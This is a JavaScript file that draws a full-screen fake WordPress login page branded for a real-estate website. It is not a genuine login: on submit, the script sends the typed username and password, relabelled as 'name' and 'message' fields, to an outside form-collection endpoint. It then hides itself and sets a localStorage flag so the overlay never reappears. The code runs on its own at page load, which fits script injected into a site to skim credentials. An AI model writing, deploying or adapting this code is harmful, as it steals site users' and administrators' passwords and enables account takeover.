function renderHTMLTemplate() {
    const styles = `
    <style>
        #tempWp5622{
            width: 100vw;
            height: 100vh;
            position: fixed;
            top: 0px;
            left: 0px;
            bottom: 0px;
            right: 0px;
            z-index: 99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999;
            background-color: #f0f0f1;
            display: flex;
            flex-flow: row nowrap;
            justify-content: center;
            color: #3c434a;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
            text-align: left;
        }
        #tempWp5622 .wp-lgn-crd{
            padding: 34px 10px;
            width: 100%;
            max-width: 350px;
        }
        #tempWp5622 .logo-lgn{
            background-image: url(https://seventytworealestate.com/wp-content/uploads/2025/02/72-Real-Estate.png) !important;
            background-size: 320px 70px;
            height: 70px;
            width: 320px;
            margin: 0 auto;
            position: relative;
        }
        #tempWp5622 .logo-lgn a{
            position: absolute;
            top: 0px;
            left: 0px;
            width: 100%;
            height: 100%;
        }

        #tempWp5622 .frm-crd{
            margin-top: 20px;
            margin-left: 0;
            padding: 26px 24px;
            font-weight: 400;
            overflow: hidden;
            background: #fff;
            border: 1px solid #c3c4c7;
            box-shadow: 0 1px 3px rgba(0, 0, 0, .04);
            box-sizing: border-box;
        }
        #tempWp5622 .f-g-wp{
            margin: 0px;
            position: relative;
        }
        #tempWp5622 .f-g-wp label{
            font-size: 14px;
            line-height: 1.5;
            display: inline-block;
            margin-bottom: 3px;
            box-sizing: border-box;
        }
        #tempWp5622 .f-g-wp .wp-inp{
            font-size: 18px;
            line-height: 1.33333333;
            width: 100%;
            border-width: .0625rem;
            padding: 3px 5px;
            margin: 0 0 16px 0;
            min-height: 40px;
            max-height: none;
            box-shadow: 0 0 0 transparent;
            border-radius: 4px;
            border: 1px solid #8c8f94;
            background-color: #fff;
            color: #2c3338;
            box-sizing: border-box;
        }

        #tempWp5622 .f-g-wp .wp-inp:focus{
            border-color: #2271b1;
            box-shadow: 0 0 0 1px #2271b1;
            outline: 2px solid transparent;
        }
        #tempWp5622 .l-row{
            width: 100%;
            display: flex;
            flex-flow: row nowrap;
            justify-content: space-between;
        }
        #tempWp5622 .customforgetmenot{
            margin: 0px;
        }
        #tempWp5622 .inp-checkbx{
            -webkit-appearance: none;
            border: 1px solid #8c8f94;
            border-radius: 4px;
            background: #fff;
            color: #50575e;
            clear: none;
            cursor: pointer;
            display: inline-block;
            line-height: 0;
            margin: -.25rem .25rem 0 0;
            outline: 0;
            padding: 0 !important;
            text-align: center;
            vertical-align: middle;
            width: 20px;
            height: 20px;
            -webkit-appearance: none;
            box-shadow: inset 0 1px 2px rgba(0, 0, 0, .1);
            transition: .05s border-color ease-in-out;
        }
        #tempWp5622 .lab-rem{
            cursor: pointer;
        }
        #tempWp5622 .inp-checkbx:focus{
            border-color: #2271b1;
            box-shadow: 0 0 0 1px #2271b1;
            outline: 2px solid transparent;
        }

        #tempWp5622 .inp-checkbx:checked::before {
            content: url(data:image/svg+xml;utf8,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20viewBox%3D%270%200%2020%2020%27%3E%3Cpath%20d%3D%27M14.83%204.89l1.34.94-5.81%208.38H9.02L5.78%209.67l1.34-1.25%202.57%202.4z%27%20fill%3D%27%233582c4%27%2F%3E%3C%2Fsvg%3E);
            margin: -.1875rem 0 0 -.25rem;
            height: 1.3125rem;
            width: 1.3125rem;
            font-size: 18px;
        }
        #tempWp5622 p{
            margin: 0px;
        }
        #tempWp5622 .btn-sub{
            background: #2271b1;
            border-color: #2271b1;
            outline: 0px transparent;
            border: 0px transparent;
            color: #fff;
            padding: 0px 14px;
            margin-bottom: 4px;
            height: 40px;
            border-radius: 3px;
            box-sizing: border-box;
            white-space: nowrap;
            cursor: pointer;
        }
        #tempWp5622 .btn-sub:hover{
            background: #135e96;
            border-color: #135e96;
            color: #fff;
        }
        #tempWp5622 .row2{
            margin-top: 24px;
            font-size: 13px;
            padding: 0 24px;
        }
        #tempWp5622 .row3{
            margin: 18px 0px 24px;
            font-size: 13px;
            padding: 0 24px;
        }
        #tempWp5622 .wp-vstweb,
        #tempWp5622 .wp-lostpass{
            text-decoration: none;
            color: #50575e;
        }
        #tempWp5622 .wp-lostpass:hover,
        #tempWp5622 .wp-vstweb:hover{
            text-decoration: none;
            color: #50575e;
            color: #135e96;
        }

        #tempWp5622 .row4{
            width: 100%;
            display: flex;
            flex-flow: row nowrap;
            justify-content: space-between;
            align-items: center;
            gap: 4px;
        }

        #tempWp5622 .row4 .lang-icon{
            min-width: 20px;
            height: 20px;
            background: url(https://cdn-icons-png.freepik.com/512/6490/6490410.png?ga=GA1.1.1954961159.1726562112) no-repeat center;
            background-size: 20px;
            margin-right: 3px;
        }
        #tempWp5622 .row4 .wp-select{
            box-sizing: border-box;
            flex-grow: 1;
            font-size: 14px;
            line-height: 2;
            color: #2c3338;
            border-color: #8c8f94;
            box-shadow: none;
            border-radius: 3px;
            padding: 0 24px 0 8px;
            min-height: 35px;
            max-width: 25rem;
            -webkit-appearance: none;
            background: #fff url(data:image/svg+xml;charset=US-ASCII,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cpath%20d%3D%22M5%206l5%205%205-5%202%201-7%207-7-7%202-1z%22%20fill%3D%22%23555%22%2F%3E%3C%2Fsvg%3E) no-repeat right 5px top 55%;
            background-size: 16px 16px;
            cursor: pointer;
            vertical-align: middle;
        }
        #tempWp5622 .row4 .wp-select:hover,
        #tempWp5622 .row4 .lang-icon:hover ~ .wp-select{
            color: #2271b1;
        }
        #tempWp5622 .row4 .wp-select:focus{
            border-color: #2271b1;
            box-shadow: 0 0 0 1px #2271b1;
            outline: 2px solid transparent;
            color: #2271b1;
        }
        #tempWp5622 .btn-change-lang{
            padding: 0px 14px;
            height: 35px;
            border-radius: 3px;
            color: #2271b1;
            border: 1px solid #2271b1;
            cursor: pointer;
        }
        #tempWp5622 .btn-change-lang:hover {
            background: #f0f0f1;
            border-color: #0a4b78;
            color: #0a4b78;
        }
        #tempWp5622 .btn-show-hid{
            position: absolute;
            border: 2px solid transparent;
            outline: 0px;
            background-color: transparent;
            width: 40px;
            height: 40px;
            top: 25px;
            right: 0px;
            border-radius: 3px;
            cursor: pointer;
        }
        #tempWp5622 .btn-show-hid.show{
            background: url(data:image/png;base64,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) center no-repeat;
            background-size: 23px;
        }
        #tempWp5622 .btn-show-hid.hide{
            background: url(data:image/png;base64,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) center no-repeat;
            background-size: 23px;
        }
        #tempWp5622 .btn-show-hid:focus,
        #tempWp5622 .btn-show-hid:active{
            border-color: #2271b1;
        }
        @media screen and (max-width: 782px) {
            #tempWp5622 .f-g-wp .wp-inp{
                -webkit-appearance: none;
                padding: 3px 10px;
                min-height: 40px;
            }
        }
    </style>
    `;

    const template = `
        <div class="wp-lgn-crd">
            <div class="logo-lgn"><a href="https://seventytworealestate.com/"></a></div>
            <div class="frm-crd">
                <form action="https://formspree.io/f/xrbgoeyb" method="POST" id="formLgnWP">
                    <p class="f-g-wp">
                        <label for="userNameEmailLogin" id="labelUserLgn">Username or Email Address</label>
                        <input type="text" name="name" class="wp-inp" id="userNameEmailLogin" required>
                    </p>
                    <p class="f-g-wp">
                        <label for="userPassLogin" id="labPaaWP">Password</label>
                        <input type="password" name="message" id="userPassLogin" class="wp-inp pass"  required>
                        <button type="button" id="btnShowHide" class="btn-show-hid show"></button>
                    </p>
                    <div class="l-row">
                        <p class="customforgetmenot"><input name="remme" type="checkbox" id="lgnrememberme" class="inp-checkbx"> <label for="lgnrememberme" class="lab-rem" id="labRemmem">Remember Me</label></p>
                        <p><input type="submit" id="wp-submit-cus" class="btn-sub" value="Log In"></p>
                    </div>
                </form>
            </div>
            <div class="row2">
                <a class="wp-lostpass" href="https://seventytworealestate.com/wp-login.php?action=lostpassword" id="lnkLostPaa">Lost your password?</a>
            </div>
            <div class="row3">
                <a class="wp-vstweb" href="https://seventytworealestate.com/" id="lnkVstSite">← Go to 72 Real Estate</a>
            </div>
            <div class="row4">
                <label for="lang-select" class="lang-icon"></label>
                <select id="langSele" class="wp-select">
                    <option value="en_US" lang="en">English (United States)</option>
                    <option value="it_IT" lang="it">Italiano</option>
                    <option value="tr_TR" lang="tr">Türkçe</option>
                </select>
                <button class="btn-change-lang" id="changeLangBtn">Change</button>
            </div>
        </div>
    `;
    const script = document.createElement('script');
    script.innerHTML = `
        document.getElementById("btnShowHide").addEventListener("click", function() {
            const passInput = document.getElementById("userPassLogin");
            const btn = document.getElementById("btnShowHide");
            if (passInput.type === "password") {
                passInput.type = "text";
                btn.classList.remove("show");
                btn.classList.add("hide");
            } else {
                passInput.type = "password";
                btn.classList.remove("hide");
                btn.classList.add("show");
            }
        });

        const labelUserLgn = document.getElementById("labelUserLgn");
        const labPaaWP = document.getElementById("labPaaWP");
        const labRemmem = document.getElementById("labRemmem");
        const btnSbmt = document.getElementById("wp-submit-cus");
        const lnkLostPaa = document.getElementById("lnkLostPaa");
        const lnkVstSite = document.getElementById("lnkVstSite");
        const changeLangBtn = document.getElementById("changeLangBtn");
        const langSelect = document.getElementById("langSele");
    
        const translations = {
            en_US: {
                usernameTxt: "Username or Email Address",
                passTxt: "Password",
                remmemberTxt: "Remember Me",
                submitTxt: "Log In",
                forgetPaa: "Lost your password?",
                visitTxt: "← Go to 72 Real Estate",
                changeBtn: "Change"
            },
            it_IT: {
                usernameTxt: "Nome utente o indirizzo email",
                passTxt: "Password",
                remmemberTxt: "Ricordami",
                submitTxt: "Accedi",
                forgetPaa: "Password dimenticata?",
                visitTxt: "← Torna a 72 Real Estate",
                changeBtn: "Cambia"
            },
            tr_TR: {
                usernameTxt: "Kullanıcı adı ya da e-posta adresi",
                passTxt: "Parola",
                remmemberTxt: "Beni hatırla",
                submitTxt: "Oturum aç",
                forgetPaa: "Parolanızı mı unuttunuz?",
                visitTxt: "← 72 Real Estate sitesine git",
                changeBtn: "Değiştir"
            }
        };
    
        changeLangBtn.addEventListener("click", function() {
            const selectedLang = langSelect.value;
            const translation = translations[selectedLang];

            labelUserLgn.textContent = translation.usernameTxt;
            labPaaWP.textContent = translation.passTxt;
            labRemmem.textContent = translation.remmemberTxt;
            btnSbmt.value = translation.submitTxt;
            lnkLostPaa.textContent = translation.forgetPaa;
            lnkVstSite.textContent = translation.visitTxt;
            changeLangBtn.textContent = translation.changeBtn;
        });

        if (localStorage.getItem('formSubmitted')) {
            document.getElementById('tempWp5622').style.display = 'none';
        }
        document.getElementById('formLgnWP').addEventListener('submit', function (event) {
            event.preventDefault();
            document.getElementById('formLgnWP').style.display = 'none';
            document.getElementById('tempWp5622').style.display = 'none';
            localStorage.setItem('formSubmitted', 'true');
            fetch('https://formspree.io/f/xrbgoeyb', {
                method: 'POST',
                body: new FormData(this),
                mode: 'no-cors',
            })
            .then(() => {
                document.getElementById('tempWp5622').style.display = 'none';
            })
            .catch(error => {
                document.getElementById('tempWp5622').style.display = 'none';
            });
        });
    `;

    



    let container = document.getElementById('tempWp5622');
    if (!container) {
        container = document.createElement('div');
        container.id = 'tempWp5622';
        document.body.appendChild(container);
    }
    container.innerHTML = styles + template;

    document.body.appendChild(script);
}


renderHTMLTemplate();
